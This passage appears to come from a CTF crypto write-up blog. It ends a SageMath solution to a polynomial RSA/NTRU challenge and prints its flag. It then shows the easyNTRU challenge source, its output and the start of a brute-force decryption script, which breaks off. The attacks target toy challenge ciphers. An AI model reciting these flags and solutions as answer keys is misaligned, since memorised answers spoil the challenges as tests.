class="number">41012</span>*x^<span class="number">94</span> + <span class="number">26028</span>*x^<span class="number">93</span> + <span class="number">3576</span>*x^<span class="number">92</span> + <span class="number">37958</span>*x^<span class="number">91</span> + <span class="number">33273</span>*x^<span class="number">90</span> + <span class="number">60228</span>*x^<span class="number">89</span> + <span class="number">41229</span>*x^<span class="number">88</span> + <span class="number">11232</span>*x^<span class="number">87</span> + <span class="number">12635</span>*x^<span class="number">86</span> + <span class="number">17942</span>*x^<span class="number">85</span> + <span class="number">4</span>*x^<span class="number">84</span> + <span class="number">25397</span>*x^<span class="number">83</span> + <span class="number">63526</span>*x^<span class="number">82</span> + <span class="number">54872</span>*x^<span class="number">81</span> + <span class="number">40318</span>*x^<span class="number">80</span> + <span class="number">37498</span>*x^<span class="number">79</span> + <span class="number">52182</span>*x^<span class="number">78</span> + <span class="number">48817</span>*x^<span class="number">77</span> + <span class="number">10763</span>*x^<span class="number">76</span> + <span class="number">46542</span>*x^<span class="number">75</span> + <span class="number">36060</span>*x^<span class="number">74</span> + <span class="number">49972</span>*x^<span class="number">73</span> + <span class="number">63603</span>*x^<span class="number">72</span> + <span class="number">46506</span>*x^<span class="number">71</span> + <span class="number">44788</span>*x^<span class="number">70</span> + <span class="number">44905</span>*x^<span class="number">69</span> + <span class="number">46112</span>*x^<span class="number">68</span> + <span class="number">5297</span>*x^<span class="number">67</span> + <span class="number">26440</span>*x^<span class="number">66</span> + <span class="number">28470</span>*x^<span class="number">65</span> + <span class="number">15525</span>*x^<span class="number">64</span> + <span class="number">11566</span>*x^<span class="number">63</span> + <span class="number">15781</span>*x^<span class="number">62</span> + <span class="number">36098</span>*x^<span class="number">61</span> + <span class="number">44402</span>*x^<span class="number">60</span> + <span class="number">55331</span>*x^<span class="number">59</span> + <span class="number">61583</span>*x^<span class="number">58</span> + <span class="number">16406</span>*x^<span class="number">57</span> + <span class="number">59089</span>*x^<span class="number">56</span> + <span class="number">53161</span>*x^<span class="number">55</span> + <span class="number">43695</span>*x^<span class="number">54</span> + <span class="number">49580</span>*x^<span class="number">53</span> + <span class="number">62685</span>*x^<span class="number">52</span> + <span class="number">31447</span>*x^<span class="number">51</span> + <span class="number">26755</span>*x^<span class="number">50</span> + <span class="number">14810</span>*x^<span class="number">49</span> + <span class="number">3281</span>*x^<span class="number">48</span> + <span class="number">27371</span>*x^<span class="number">47</span> + <span class="number">53392</span>*x^<span class="number">46</span> + <span class="number">2648</span>*x^<span class="number">45</span> + <span class="number">10095</span>*x^<span class="number">44</span> + <span class="number">25977</span>*x^<span class="number">43</span> + <span class="number">22912</span>*x^<span class="number">42</span> + <span class="number">41278</span>*x^<span class="number">41</span> + <span class="number">33236</span>*x^<span class="number">40</span> + <span class="number">57792</span>*x^<span class="number">39</span> + <span class="number">7169</span>*x^<span class="number">38</span> + <span class="number">29250</span>*x^<span class="number">37</span> + <span class="number">16906</span>*x^<span class="number">36</span> + <span class="number">4436</span>*x^<span class="number">35</span> + <span class="number">2729</span>*x^<span class="number">34</span> + <span class="number">29736</span>*x^<span class="number">33</span> + <span class="number">19383</span>*x^<span class="number">32</span> + <span class="number">11921</span>*x^<span class="number">31</span> + <span class="number">26075</span>*x^<span class="number">30</span> + <span class="number">54616</span>*x^<span class="number">29</span> + <span class="number">739</span>*x^<span class="number">28</span> + <span class="number">38509</span>*x^<span class="number">27</span> + <span class="number">19118</span>*x^<span class="number">26</span> + <span class="number">20062</span>*x^<span class="number">25</span> + <span class="number">21280</span>*x^<span class="number">24</span> + <span class="number">12594</span>*x^<span class="number">23</span> + <span class="number">14974</span>*x^<span class="number">22</span> + <span class="number">27795</span>*x^<span class="number">21</span> + <span class="number">54107</span>*x^<span class="number">20</span> + <span class="number">1890</span>*x^<span class="number">19</span> + <span class="number">13410</span>*x^<span class="number">18</span> + <span class="number">5381</span>*x^<span class="number">17</span> + <span class="number">19500</span>*x^<span class="number">16</span> + <span class="number">47481</span>*x^<span class="number">15</span> + <span class="number">58488</span>*x^<span class="number">14</span> + <span class="number">26433</span>*x^<span class="number">13</span> + <span class="number">37803</span>*x^<span class="number">12</span> + <span class="number">60232</span>*x^<span class="number">11</span> + <span class="number">34772</span>*x^<span class="number">10</span> + <span class="number">1505</span>*x^<span class="number">9</span> + <span class="number">63760</span>*x^<span class="number">8</span> + <span class="number">20890</span>*x^<span class="number">7</span> + <span class="number">41533</span>*x^<span class="number">6</span> + <span class="number">16130</span>*x^<span class="number">5</span> + <span class="number">29769</span>*x^<span class="number">4</span> + <span class="number">49142</span>*x^<span class="number">3</span> + <span class="number">64184</span>*x^<span class="number">2</span> + <span class="number">55443</span>*x + <span class="number">45925</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">C</span> = <span class="number">19921</span>*x^<span class="number">174</span> + <span class="number">49192</span>*x^<span class="number">173</span> + <span class="number">18894</span>*x^<span class="number">172</span> + <span class="number">61121</span>*x^<span class="number">171</span> + <span class="number">50271</span>*x^<span class="number">170</span> + <span class="number">11860</span>*x^<span class="number">169</span> + <span class="number">53128</span>*x^<span class="number">168</span> + <span class="number">38658</span>*x^<span class="number">167</span> + <span class="number">14191</span>*x^<span class="number">166</span> + <span class="number">9671</span>*x^<span class="number">165</span> + <span class="number">40879</span>*x^<span class="number">164</span> + <span class="number">15187</span>*x^<span class="number">163</span> + <span class="number">33523</span>*x^<span class="number">162</span> + <span class="number">62270</span>*x^<span class="number">161</span> + <span class="number">64211</span>*x^<span class="number">160</span> + <span class="number">54518</span>*x^<span class="number">159</span> + <span class="number">50446</span>*x^<span class="number">158</span> + <span class="number">2597</span>*x^<span class="number">157</span> + <span class="number">32216</span>*x^<span class="number">156</span> + <span class="number">10500</span>*x^<span class="number">155</span> + <span class="number">63276</span>*x^<span class="number">154</span> + <span class="number">27916</span>*x^<span class="number">153</span> + <span class="number">55316</span>*x^<span class="number">152</span> + <span class="number">30898</span>*x^<span class="number">151</span> + <span class="number">43706</span>*x^<span class="number">150</span> + <span class="number">5734</span>*x^<span class="number">149</span> + <span class="number">35616</span>*x^<span class="number">148</span> + <span class="number">14288</span>*x^<span class="number">147</span> + <span class="number">18282</span>*x^<span class="number">146</span> + <span class="number">22788</span>*x^<span class="number">145</span> + <span class="number">48188</span>*x^<span class="number">144</span> + <span class="number">34176</span>*x^<span class="number">143</span> + <span class="number">55952</span>*x^<span class="number">142</span> + <span class="number">9578</span>*x^<span class="number">141</span> + <span class="number">9177</span>*x^<span class="number">140</span> + <span class="number">22083</span>*x^<span class="number">139</span> + <span class="number">14586</span>*x^<span class="number">138</span> + <span class="number">9748</span>*x^<span class="number">137</span> + <span class="number">21118</span>*x^<span class="number">136</span> + <span class="number">155</span>*x^<span class="number">135</span> + <span class="number">64224</span>*x^<span class="number">134</span> + <span class="number">18193</span>*x^<span class="number">133</span> + <span class="number">33732</span>*x^<span class="number">132</span> + <span class="number">38135</span>*x^<span class="number">131</span> + <span class="number">51992</span>*x^<span class="number">130</span> + <span class="number">8203</span>*x^<span class="number">129</span> + <span class="number">8538</span>*x^<span class="number">128</span> + <span class="number">55203</span>*x^<span class="number">127</span> + <span class="number">5003</span>*x^<span class="number">126</span> + <span class="number">2009</span>*x^<span class="number">125</span> + <span class="number">45023</span>*x^<span class="number">124</span> + <span class="number">12311</span>*x^<span class="number">123</span> + <span class="number">21428</span>*x^<span class="number">122</span> + <span class="number">24110</span>*x^<span class="number">121</span> + <span class="number">43537</span>*x^<span class="number">120</span> + <span class="number">21885</span>*x^<span class="number">119</span> + <span class="number">50212</span>*x^<span class="number">118</span> + <span class="number">40445</span>*x^<span class="number">117</span> + <span class="number">17768</span>*x^<span class="number">116</span> + <span class="number">46616</span>*x^<span class="number">115</span> + <span class="number">4771</span>*x^<span class="number">114</span> + <span class="number">20903</span>*x^<span class="number">113</span> + <span class="number">47764</span>*x^<span class="number">112</span> + <span class="number">13056</span>*x^<span class="number">111</span> + <span class="number">50837</span>*x^<span class="number">110</span> + <span class="number">22313</span>*x^<span class="number">109</span> + <span class="number">39698</span>*x^<span class="number">108</span> + <span class="number">60377</span>*x^<span class="number">107</span> + <span class="number">59357</span>*x^<span class="number">106</span> + <span class="number">24051</span>*x^<span class="number">105</span> + <span class="number">5888</span>*x^<span class="number">104</span> + <span class="number">29414</span>*x^<span class="number">103</span> + <span class="number">31726</span>*x^<span class="number">102</span> + <span class="number">4906</span>*x^<span class="number">101</span> + <span class="number">23968</span>*x^<span class="number">100</span> + <span class="number">52360</span>*x^<span class="number">99</span> + <span class="number">58063</span>*x^<span class="number">98</span> + <span class="number">706</span>*x^<span class="number">97</span> + <span class="number">31420</span>*x^<span class="number">96</span> + <span class="number">62468</span>*x^<span class="number">95</span> + <span class="number">18557</span>*x^<span class="number">94</span> + <span class="number">1498</span>*x^<span class="number">93</span> + <span class="number">17590</span>*x^<span class="number">92</span> + <span class="number">62990</span>*x^<span class="number">91</span> + <span class="number">27200</span>*x^<span class="number">90</span> + <span class="number">7052</span>*x^<span class="number">89</span> + <span class="number">39117</span>*x^<span class="number">88</span> + <span class="number">46944</span>*x^<span class="number">87</span> + <span class="number">45535</span>*x^<span class="number">86</span> + <span class="number">28092</span>*x^<span class="number">85</span> + <span class="number">1981</span>*x^<span class="number">84</span> + <span class="number">4377</span>*x^<span class="number">83</span> + <span class="number">34419</span>*x^<span class="number">82</span> + <span class="number">33754</span>*x^<span class="number">81</span> + <span class="number">2640</span>*x^<span class="number">80</span> + <span class="number">44427</span>*x^<span class="number">79</span> + <span class="number">32179</span>*x^<span class="number">78</span> + <span class="number">57721</span>*x^<span class="number">77</span> + <span class="number">9444</span>*x^<span class="number">76</span> + <span class="number">49374</span>*x^<span class="number">75</span> + <span class="number">21288</span>*x^<span class="number">74</span> + <span class="number">44098</span>*x^<span class="number">73</span> + <span class="number">57744</span>*x^<span class="number">72</span> + <span class="number">63457</span>*x^<span class="number">71</span> + <span class="number">43300</span>*x^<span class="number">70</span> + <span class="number">1508</span>*x^<span class="number">69</span> + <span class="number">13775</span>*x^<span class="number">68</span> + <span class="number">23197</span>*x^<span class="number">67</span> + <span class="number">43070</span>*x^<span class="number">66</span> + <span class="number">20751</span>*x^<span class="number">65</span> + <span class="number">47479</span>*x^<span class="number">64</span> + <span class="number">18496</span>*x^<span class="number">63</span> + <span class="number">53392</span>*x^<span class="number">62</span> + <span class="number">10387</span>*x^<span class="number">61</span> + <span class="number">2317</span>*x^<span class="number">60</span> + <span class="number">57492</span>*x^<span class="number">59</span> + <span class="number">25441</span>*x^<span class="number">58</span> + <span class="number">52532</span>*x^<span class="number">57</span> + <span class="number">27150</span>*x^<span class="number">56</span> + <span class="number">33788</span>*x^<span class="number">55</span> + <span class="number">43371</span>*x^<span class="number">54</span> + <span class="number">30972</span>*x^<span class="number">53</span> + <span class="number">39583</span>*x^<span class="number">52</span> + <span class="number">36407</span>*x^<span class="number">51</span> + <span class="number">35564</span>*x^<span class="number">50</span> + <span class="number">44564</span>*x^<span class="number">49</span> + <span class="number">1505</span>*x^<span class="number">48</span> + <span class="number">47519</span>*x^<span class="number">47</span> + <span class="number">38695</span>*x^<span class="number">46</span> + <span class="number">43107</span>*x^<span class="number">45</span> + <span class="number">1676</span>*x^<span class="number">44</span> + <span class="number">42057</span>*x^<span class="number">43</span> + <span class="number">49879</span>*x^<span class="number">42</span> + <span class="number">29083</span>*x^<span class="number">41</span> + <span class="number">42241</span>*x^<span class="number">40</span> + <span class="number">8853</span>*x^<span class="number">39</span> + <span class="number">33546</span>*x^<span class="number">38</span> + <span class="number">48954</span>*x^<span class="number">37</span> + <span class="number">30352</span>*x^<span class="number">36</span> + <span class="number">62020</span>*x^<span class="number">35</span> + <span class="number">39864</span>*x^<span class="number">34</span> + <span class="number">9519</span>*x^<span class="number">33</span> + <span class="number">24828</span>*x^<span class="number">32</span> + <span class="number">34696</span>*x^<span class="number">31</span> + <span class="number">2387</span>*x^<span class="number">30</span> + <span class="number">27413</span>*x^<span class="number">29</span> + <span class="number">55829</span>*x^<span class="number">28</span> + <span class="number">40217</span>*x^<span class="number">27</span> + <span class="number">30205</span>*x^<span class="number">26</span> + <span class="number">42328</span>*x^<span class="number">25</span> + <span class="number">6210</span>*x^<span class="number">24</span> + <span class="number">52442</span>*x^<span class="number">23</span> + <span class="number">58495</span>*x^<span class="number">22</span> + <span class="number">2014</span>*x^<span class="number">21</span> + <span class="number">26452</span>*x^<span class="number">20</span> + <span class="number">33547</span>*x^<span class="number">19</span> + <span class="number">19840</span>*x^<span class="number">18</span> + <span class="number">5995</span>*x^<span class="number">17</span> + <span class="number">16850</span>*x^<span class="number">16</span> + <span class="number">37855</span>*x^<span class="number">15</span> + <span class="number">7221</span>*x^<span class="number">14</span> + <span class="number">32200</span>*x^<span class="number">13</span> + <span class="number">8121</span>*x^<span class="number">12</span> + <span class="number">23767</span>*x^<span class="number">11</span> + <span class="number">46563</span>*x^<span class="number">10</span> + <span class="number">51673</span>*x^<span class="number">9</span> + <span class="number">19372</span>*x^<span class="number">8</span> + <span class="number">4157</span>*x^<span class="number">7</span> + <span class="number">48421</span>*x^<span class="number">6</span> + <span class="number">41096</span>*x^<span class="number">5</span> + <span class="number">45735</span>*x^<span class="number">4</span> + <span class="number">53022</span>*x^<span class="number">3</span> + <span class="number">35475</span>*x^<span class="number">2</span> + <span class="number">47521</span>*x + <span class="number">27544</span></span><br><span class="line"><span class="attribute">roots</span> = factor(N)</span><br><span class="line"><span class="attribute">P</span> = roots[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="attribute">Q</span> = roots[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="attribute">PHI</span> = (p^P.degree()-<span class="number">1</span>)*(p^Q.degree()-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">D</span> = int(gmpy<span class="number">2</span>.invert(e, PHI))</span><br><span class="line"><span class="attribute">M</span> = pow(C,D,N)</span><br><span class="line"><span class="attribute">print</span>(M)</span><br><span class="line"><span class="attribute">hint</span> = &#x27;&#x27;.join([str(i) for i in M])</span><br><span class="line"><span class="attribute">print</span>(hint)</span><br><span class="line"><span class="attribute">h</span> = int(hint)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = <span class="number">106472061241112922861460644342336453303928202010237284715354717630502168520267</span></span><br><span class="line"><span class="attribute">v1</span> = vector(ZZ,<span class="meta"> [1, h])</span></span><br><span class="line"><span class="meta">v2 = vector(ZZ, [0, p])</span></span><br><span class="line"><span class="meta">m = matrix([v1,v2]);</span></span><br><span class="line"><span class="meta">f, g1 = m.LLL()[0]</span></span><br><span class="line"><span class="attribute">print</span>(f, g<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">g1</span> =  <span class="number">228679177303871981036829786447405151037</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857</span></span><br><span class="line"><span class="attribute">for</span> rand in range(<span class="number">0</span>, <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">    <span class="attribute">if</span> rand % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="attribute">print</span>(rand)</span><br><span class="line">    <span class="attribute">g</span> = g<span class="number">1</span>^^(rand)</span><br><span class="line">    <span class="attribute">if</span> n % g == <span class="number">0</span>:</span><br><span class="line">        <span class="attribute">p</span> = n//g</span><br><span class="line">        <span class="attribute">break</span></span><br><span class="line">        </span><br><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">c</span> = <span class="number">20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714</span></span><br><span class="line"><span class="attribute">phi</span> = (g-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">d</span> = int(gmpy<span class="number">2</span>.invert(e, phi))</span><br><span class="line"><span class="attribute">m</span> = int(pow(c, d, n))</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(m))</span><br><span class="line"><span class="comment"># DASCTF&#123;P01yn0m141RS4_W17h_NTRU&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>DASCTF{P01yn0m141RS4_W17h_NTRU}</p></blockquote><h1 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><ul><li><p>easyNTRU</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># parameters</span></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q&gt;(<span class="number">6</span>*d+<span class="number">1</span>)*p</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#d1 1s and #d2 -1s</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span>(<span class="params">d1, d2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1+d2</span><br><span class="line">    s = [<span class="number">1</span>]*d1 + [-<span class="number">1</span>]*d2 + [<span class="number">0</span>]*(N-d1-d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertModPrime</span>(<span class="params">f, p</span>):</span></span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f, g</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^N-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">liftMod</span>(<span class="params">f, q</span>):</span></span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">polyMod</span>(<span class="params">f, q</span>):</span></span><br><span class="line">    g = [f[i]%q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertModPow2</span>(<span class="params">f, q</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertModPrime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = liftMod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = liftMod(convolution(g,<span class="number">2</span> - r),q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genMessage</span>():</span></span><br><span class="line">    result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKey</span>():</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      f = T(d+<span class="number">1</span>, d)</span><br><span class="line">      g = T(d, d)</span><br><span class="line">      Fp = polyMod(invertModPrime(f, p), p)</span><br><span class="line">      Fq = polyMod(invertModPow2(f, q), q)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">  h = polyMod(convolution(Fq, g), q)</span><br><span class="line">  <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, h</span>):</span></span><br><span class="line">  e = liftMod(p*convolution(h, T(d, d)) + m, q)</span><br><span class="line">  <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">h, secret = genKey()</span><br><span class="line">m = genMessage()</span><br><span class="line">e = encrypt(m, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h = %s&#x27;</span> % h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %s&#x27;</span> % e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">sha3 = SHA3_256.new()</span><br><span class="line">sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">key = sha3.digest()</span><br><span class="line"></span><br><span class="line">cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">c = cypher.encrypt(pad(flag, <span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %s&#x27;</span> % c)</span><br></pre></td></tr></table></figure></li><li><p><strong>out</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">h</span> = <span class="number">39</span>*x^<span class="number">9</span> + <span class="number">60</span>*x^<span class="number">8</span> + <span class="number">349</span>*x^<span class="number">7</span> + <span class="number">268</span>*x^<span class="number">6</span> + <span class="number">144</span>*x^<span class="number">5</span> + <span class="number">469</span>*x^<span class="number">4</span> + <span class="number">449</span>*x^<span class="number">3</span> + <span class="number">165</span>*x^<span class="number">2</span> + <span class="number">248</span>*x + <span class="number">369</span></span><br><span class="line"><span class="attribute">e</span> = -<span class="number">144</span>*x^<span class="number">9</span> - <span class="number">200</span>*x^<span class="number">8</span> - <span class="number">8</span>*x^<span class="number">7</span> + <span class="number">248</span>*x^<span class="number">6</span> + <span class="number">85</span>*x^<span class="number">5</span> + <span class="number">102</span>*x^<span class="number">4</span> + <span class="number">167</span>*x^<span class="number">3</span> + <span class="number">30</span>*x^<span class="number">2</span> - <span class="number">203</span>*x - <span class="number">78</span></span><br><span class="line"><span class="attribute">c</span> = b&#x27;\xb<span class="number">9</span>W\x<span class="number">8</span>c\x<span class="number">8</span>b\x<span class="number">0</span>cG\xde\x<span class="number">7</span>fl\xf<span class="number">7</span>\x<span class="number">03</span>\xbb<span class="number">9</span>m\x<span class="number">0</span>c\xc<span class="number">4</span>L\xfe\xe<span class="number">9</span>Q\xad\xfd\xda!\x<span class="number">1</span>a\xea@&#125;U\x<span class="number">9</span>ay<span class="number">4</span>\x<span class="number">8</span>a\xe<span class="number">3</span>y\xdf\xd<span class="number">5</span>BV\xa<span class="number">7</span>\x<span class="number">06</span>\xf<span class="number">9</span>\x<span class="number">08</span>\x<span class="number">96</span>=<span class="string">&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><p>赛时，Mu_chen师傅负责这道，出了，我便也没看了。</p><p>以后为赛后复现。</p><p>关注以下代码</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">p</span> = <span class="number">3</span></span><br><span class="line"><span class="variable">N</span> = <span class="number">10</span></span><br><span class="line"><span class="variable">def</span> <span class="function"><span class="title">genMessage</span>():</span></span><br><span class="line"><span class="function">    <span class="variable"><span class="class">result</span></span> = <span class="title">list</span>(<span class="title">randrange</span>(<span class="variable">p</span>) - <span class="number">1</span> <span class="variable">for</span> <span class="variable">j</span> <span class="variable"><span class="keyword">in</span></span> <span class="title">range</span>(<span class="variable">N</span>))</span></span><br><span class="line">    <span class="variable">return</span> <span class="function"><span class="title">R</span>(<span class="variable"><span class="class">result</span></span>)</span></span><br><span class="line"><span class="variable">m</span> = <span class="function"><span class="title">genMessage</span>()</span></span><br></pre></td></tr></table></figure><p>发现作为AES加密的密钥，长度为10的m，每个值只有-1、1、0三种可能</p><p>可以爆破求解</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line">from Crypto.Hash import SHA3_256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">N = 10</span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">c = b&#x27;<span class="symbol">\x</span>b9W<span class="symbol">\x</span>8c<span class="symbol">\x</span>8b<span class="symbol">\x</span>0cG<span class="symbol">\x</span>de<span class="symbol">\x</span>7fl<span class="symbol">\x</span>f7<span class="symbol">\x</span>03<span class="symbol">\x</span>bb9m<span class="symbol">\x</span>0c<span class="symbol">\x</span>c4L<span class="symbol">\x</span>fe<span class="symbol">\x</span>e9Q<span class="symbol">\x</span>ad<span class="symbol">\x</span>fd<span class="symbol">\x</span>da!<span class="symbol">\x</span>1a<span class="symbol">\x</span>ea@&#125;U<span class="symbol">\x</span>9ay4<span class="symbol">\x</span>8a<span class="symbol">\x</span>e3y<span class="symbol">\x</span>df<span class="symbol">\x</span>d5BV<span class="symbol">\x</span>a7<span class="symbol">\x</span>06<span class="symbol">\x</span>f9<span class="symbol">\x</span>08<span class="symbol">\x</span>96=&quot;f<span class="symbol">\x</span>c1<span class="symbol">\x</span>1b<span class="symbol">\x</span>d7<span class="symbol">\x</span>db<span class="symbol">\x</span>c1j<span class="symbol">\x</span>82F<span class="symbol">\x</span>0b<span class="symbol">\x</span>16<span class="symbol">\x</span>06<span class="symbol">\x</span>bcJMB<span class="symbol">\x</span>c8<span class="symbol">\x</span>80&#x27;</span><br><span class="line">table = [-1, 0, 1]</span><br><span class="line">for i in product(table, repeat=N):</span><br><span class="line">    m = R(list(i))</span><br><span class="line">    sha3 = SHA3_256.new()</span><br><span class="line">    key = sha3.update(bytes(str(m).encode(&#x27;utf-8&#x27;))).digest()</span><br><span class="line">    tmp = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    try:</span><br><span class="line">        flag = 